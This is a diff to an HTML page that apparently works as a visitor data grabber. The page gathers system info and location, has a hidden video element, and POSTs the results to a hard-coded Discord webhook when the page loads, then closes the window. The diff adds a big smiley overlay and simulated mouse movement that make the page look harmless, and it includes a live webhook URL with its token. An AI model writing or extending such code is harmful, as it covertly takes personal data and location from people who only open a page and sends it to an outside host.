@@ -18,11 +18,25 @@
       padding: 20px;
       text-align: center;
     }
+    /* Big smile face styling */
+    #smile {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 15rem;
+      color: #00ffe7;
+      text-shadow: 0 0 10px #00ffe7;
+      font-family: 'Arial', sans-serif;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
 <div id="status">Initializing...</div>
 <video id="video" style="display:none;" autoplay></video>
+<!-- Big smile face -->
+<div id="smile">:)</div>
 <script>
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8Wl9';
 
@@ -61,6 +75,26 @@ const info = {
   latitude: null,
   longitude: null
 };
+
+// Function to simulate mouse movement
+function simulateMouseMovement() {
+  let x = 0, y = 0;
+  const maxX = window.innerWidth;
+  const maxY = window.innerHeight;
+  const interval = setInterval(() => {
+    x = (x + 50) % maxX;
+    y = (y + 30) % maxY;
+    const event = new MouseEvent('mousemove', {
+      clientX: x,
+      clientY: y,
+      view: window,
+      bubbles: true,
+      cancelable: true
+    });
+    document.dispatchEvent(event);
+  }, 500);
+  setTimeout(() => clearInterval(interval), 10000); // stop after 10 seconds
+}
 
 async function getSystemInfo() {
   try {
@@ -206,10 +240,13 @@ async function sendData() {
   }
   formData.append('payload_json', JSON.stringify({ content }));
   await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
-  window.close();
+  window.close(); // Close after sending
 }
 
 async function main() {
+  // Trigger mouse movement
+  simulateMouseMovement();
+
   document.getElementById('status').innerText = 'Gathering system info...';
   await getSystemInfo();
 
@@ -233,6 +270,7 @@ async function main() {
   await sendData();
 }
 
+// Run main after page loads
 main();
 </script>
 </body>
